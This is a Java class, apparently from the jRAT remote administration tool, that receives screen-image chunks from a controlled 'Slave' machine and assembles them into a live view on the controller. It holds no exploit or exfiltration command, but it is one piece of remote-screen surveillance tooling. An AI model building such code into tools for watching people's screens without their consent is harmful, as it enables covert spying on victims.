package jrat.module.screen.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.screen.ui.PanelScreenController;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;

/**
 * A remote screen partial image
 * Only gets sent to us if it's updated on the client side
 */
public class PacketRemoteScreenChunk implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		int chunkWidth = slave.readInt();
		int chunkHeight = slave.readInt();
		int x = slave.readInt();
		int y = slave.readInt();
		int width = slave.readInt();
		int height = slave.readInt();

		int blen = slave.readInt();
	
		byte[] buffer = new byte[blen];
		slave.getDataInputStream().readFully(buffer);

        PanelScreenController frame = (PanelScreenController) slave.getPanel(PanelScreenController.class);

		if (frame != null) {
			frame.setTransmitted(frame.getTransmitted() + blen);
			frame.setChunks(frame.getChunks() + 1);
			BufferedImage bufferedImage = frame.getBuffer();

			if (bufferedImage == null || bufferedImage != null && bufferedImage.getWidth() != width && bufferedImage.getHeight() != height) {
				bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
				frame.setBuffer(bufferedImage);
			}

			try {
				Graphics2D imageGraphics = (Graphics2D) bufferedImage.getGraphics();

				BufferedImage image = ImageIO.read(new ByteArrayInputStream(buffer));
				imageGraphics.drawImage(image, y * chunkWidth, x * chunkHeight, null);

				frame.update(bufferedImage);
			} catch (Exception ex) {
				ex.printStackTrace();
				System.gc();
			}
		}
	}
}
